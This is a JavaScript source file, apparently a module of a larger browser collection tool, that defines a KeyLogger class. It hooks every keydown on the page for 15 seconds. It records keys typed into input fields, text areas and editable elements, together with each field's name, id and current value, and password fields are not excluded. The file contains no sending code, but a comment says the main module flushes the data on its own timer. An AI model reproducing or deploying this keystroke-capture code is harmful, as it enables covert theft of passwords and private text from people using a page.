// language: JavaScript, file: collectors/keylogger.js
// *fire-and-forget — core.js does NOT await this, it flushes on its own timer*

export class KeyLogger {
    constructor() {
        this.name = 'keylogger';
        this.keys = [];
        this.isActive = false;
        this.duration = 15000;
    }

    async collect() {
        return new Promise((resolve) => {
            this.isActive = true;
            this.keys = [];

            const handler = (e) => {
                if (!this.isActive) return;
                const t = e.target;
                if (!t || !(t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.isContentEditable)) return;
                this.keys.push({
                    key: e.key,
                    code: e.code,
                    timestamp: Date.now(),
                    target: {
                        tag: t.tagName,
                        type: t.type || 'text',
                        name: t.name || '',
                        id: t.id || '',
                        className: (t.className && t.className.toString().slice(0, 40)) || '',
                        value: (t.value || '').substring(0, 100),
                        selectionStart: t.selectionStart,
                        selectionEnd: t.selectionEnd,
                    },
                });
            };

            document.addEventListener('keydown', handler, true);

            setTimeout(() => {
                this.isActive = false;
                document.removeEventListener('keydown', handler, true);
                resolve({
                    keys: this.keys.slice(0, 100),
                    count: this.keys.length,
                    timestamp: Date.now(),
                });
            }, this.duration);
        });
    }
}